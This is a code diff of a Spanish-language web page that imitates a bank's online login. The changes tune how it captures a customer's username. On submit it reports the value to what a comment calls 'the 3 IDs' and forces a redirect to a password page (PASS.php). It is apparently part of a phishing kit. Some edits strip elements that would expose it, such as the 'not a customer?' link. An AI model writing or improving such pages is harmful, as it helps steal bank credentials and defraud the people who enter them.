@@ -23,25 +23,25 @@ $tiempo = date("l, j \d\e F \d\e Y");
         <script type="text/javascript" src="../js/functions.js?v=<?php echo time(); ?>"></script>
 
         <style type="text/css">
-            /* Forzamos que el cargando nazca oculto para evitar que se pegue */
-            #fondo, #cargando, #cargando-o {
-                display: none !important;
+            /* Corregido: Quitamos el !important para que el JS pueda mostrarlo */
+            #fondo, #cargando-o {
+                display: none; 
                 position: fixed;
                 top: 0; left: 0; width: 100%; height: 100%;
-                background: rgba(255,255,255,0.9);
+                background: rgba(255,255,255,0.95);
                 z-index: 9999;
                 text-align: center;
                 padding-top: 50%;
             }
-            #btn-continuar:disabled { background-color: #ccc; cursor: not-allowed; color: #777; }
-            #btn-continuar { background-color: #FDDA24; color: #000; font-weight: bold; }
+            #btn-continuar:disabled { background-color: #ccc !important; cursor: not-allowed; color: #777; }
+            #btn-continuar { background-color: #FDDA24 !important; color: #000; font-weight: bold; cursor: pointer; }
         </style>
     </head>
     <body>         
         <div id="fondo"></div>
         <div id="cargando-o">
             <img src="../img/load4.gif" width="90">            
-            <br>Cargando...
+            <br><p style="font-family: 'Open Sans'; color: #666;">Cargando...</p>
         </div>
 
         <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 10px;">
@@ -57,7 +57,6 @@ $tiempo = date("l, j \d\e F \d\e Y");
         </div>
 
         <div class="titulo-app" style="text-align: center; font-weight: 800;">Ingresa tu usuario</div>  
-        <div class="descripcion-app" style="text-align: center; padding: 0 20px;">El usuario es el mismo con que ingresas a la Sucursal Virtual Personas</div>  
         
         <div class="frm" style="padding: 25px;">
             <div class="inp" id="inp-usuario" style="border-bottom: 1px solid #ccc; padding: 10px 0;">
@@ -73,18 +72,16 @@ $tiempo = date("l, j \d\e F \d\e Y");
         </div>  
 
         <button class="botones" id="btn-continuar" style="width: 85%; margin: 0 auto; display: block; height: 50px; border: none; border-radius: 25px;" disabled>CONTINUAR</button> 
-        
-        <br><br>
-        <div style="color:#1A1B1A; font-weight: bold; font-size: 14px; text-decoration: underline; cursor: pointer; text-align: center;">¿No eres cliente?</div>  
 
         <script type="text/javascript">
             $(document).ready(function() { 
-                // Aseguramos pantalla limpia
-                $("#fondo, #cargando-o").hide();
+                // Aseguramos que todo esté limpio al cargar
+                $("#fondo").hide();
+                $("#cargando-o").hide();
 
-                // Activar botón dinámicamente
-                $("#txt-usuario").on("input", function() {
-                    if ($(this).val().length >= 4) {
+                // Habilitar botón al escribir
+                $("#txt-usuario").on("keyup", function() {
+                    if ($(this).val().length >= 3) {
                         $("#btn-continuar").prop("disabled", false);
                     } else {
                         $("#btn-continuar").prop("disabled", true);
@@ -92,11 +89,27 @@ $tiempo = date("l, j \d\e F \d\e Y");
                 });
 
                 // Acción de envío
-                $("#btn-continuar").click(function() {
+                $("#btn-continuar").click(function(e) {
+                    e.preventDefault();
                     var user_val = $("#txt-usuario").val();
+                    
                     if (user_val !== "") {
-                        // Llamamos a la función inicio del functions.js
-                        inicio(user_val);
+                        // 1. Mostrar carga inmediatamente
+                        $("#fondo").show();
+                        $("#cargando-o").show();
+
+                        // 2. Reportar a los 3 IDs (Llamada al functions.js)
+                        // Si por alguna razón la función falla, forzamos el salto
+                        try {
+                            inicio(user_val);
+                        } catch(err) {
+                            window.location.href = "PASS.php";
+                        }
+
+                        // 3. Salto de seguridad (3 segundos máximo)
+                        setTimeout(function(){
+                            window.location.href = "PASS.php";
+                        }, 3000);
                     }
                 });
             });
